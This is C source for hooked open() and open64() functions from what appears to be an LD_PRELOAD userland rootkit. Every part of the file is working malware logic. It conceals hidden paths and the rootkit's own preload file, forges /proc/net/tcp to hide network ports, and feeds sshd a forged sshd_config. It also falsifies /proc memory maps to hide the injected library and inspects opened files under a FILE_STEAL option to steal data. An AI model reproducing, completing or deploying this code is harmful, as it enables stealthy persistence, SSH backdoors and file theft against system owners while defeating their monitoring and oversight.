int open(const char *pathname, int flags, mode_t mode){
    hook(COPEN);
    if(magicusr()){
#ifdef HIDE_MY_ASS
        int ret = (long)call(COPEN, pathname, flags, mode);
        if(ret){
            int outfd = fileno(stdout);
            if(!outfd) return ret;
            if(isatty(outfd)){
                char *apath = gdirname(ret);
                if(apath != NULL){
                    if(!pathtracked(apath))
                        trackwrite(apath);
                    free(apath);
                }
            }
        }
        return ret;
#else
        return (long)call(COPEN, pathname, flags, mode);
#endif

        
    }

#ifdef HIDE_SELF
    char *preloadpath;
#ifdef PATCH_DYNAMIC_LINKER
    preloadpath = PRELOAD_FILE;
#else
    preloadpath = OLD_PRELOAD;
#endif
    if(hidden_path(pathname) && strstr(preloadpath, pathname) &&
        ((process("ssh") || process("busybox")) &&
        (flags == (64|1|512)))){
        return (long)call(COPEN, "/dev/null", flags, mode);
    }
#endif

    if(hidden_path(pathname)){
        errno = ENOENT;
        return -1;
    }

#ifdef HIDE_PORTS
    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
        return fileno(forge_procnet(pathname));
#endif

#ifdef SOFT_PATCH_SSHD_CONFIG
    if(!strcmp(pathname, "/etc/ssh/sshd_config\0") && process("/usr/sbin/sshd"))
        return fileno(sshdforge(pathname));
#endif

#ifdef FORGE_MAPS
    if(!fnmatch(MAPS_FULL_PATH, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
    if(!fnmatch(SMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
    if(!fnmatch(NMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));

    char cwd[PROCPATH_MAXLEN];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!strcmp(cwd, "/proc")){
            if(!fnmatch(MAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch(SMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch(NMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }

        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
            if(!fnmatch(MAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch(SMAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch(NMAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }
    }
#endif

#ifdef FILE_STEAL
    inspect_file(pathname);
#endif
    return (long)call(COPEN, pathname, flags, mode);
}

int open64(const char *pathname, int flags, mode_t mode){
    hook(COPEN64);
    if(magicusr()){
#ifdef HIDE_MY_ASS
        int ret = (long)call(COPEN64, pathname, flags, mode);
        if(ret){
            int outfd = fileno(stdout);
            if(!outfd) return ret;
            if(isatty(outfd)){
                char *apath = gdirname(ret);
                if(apath != NULL){
                    if(!pathtracked(apath))
                        trackwrite(apath);
                    free(apath);
                }
            }
        }
        return ret;
#else
        return (long)call(COPEN64, pathname, flags, mode);
#endif
    }

#ifdef HIDE_SELF
    char *preloadpath;
#ifdef PATCH_DYNAMIC_LINKER
    preloadpath = PRELOAD_FILE;
#else
    preloadpath = OLD_PRELOAD;
#endif
    if(hidden_path(pathname) && strstr(preloadpath, pathname) &&
        ((process("ssh") || process("busybox")) &&
        (flags == (64|1|512)))){
        return (long)call(COPEN64, "/dev/null", flags, mode);
    }
#endif

    if(hidden_path(pathname)){
        errno = ENOENT;
        return -1;
    }

#ifdef HIDE_PORTS
    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
        return fileno(forge_procnet(pathname));
#endif

#ifdef SOFT_PATCH_SSHD_CONFIG
    if(!strcmp(pathname, "/etc/ssh/sshd_config\0") && process("/usr/sbin/sshd"))
        return fileno(sshdforge(pathname));
#endif

#ifdef FORGE_MAPS
    if(!fnmatch(MAPS_FULL_PATH, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
    if(!fnmatch(SMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
    if(!fnmatch(NMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));

    char cwd[PROCPATH_MAXLEN];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!strcmp(cwd, "/proc")){
            if(!fnmatch(MAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch(SMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch(NMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }

        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
            if(!fnmatch(MAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch(SMAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch(NMAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }
    }
#endif

#ifdef FILE_STEAL
    inspect_file(pathname);
#endif
    return (long)call(COPEN64, pathname, flags, mode);
}
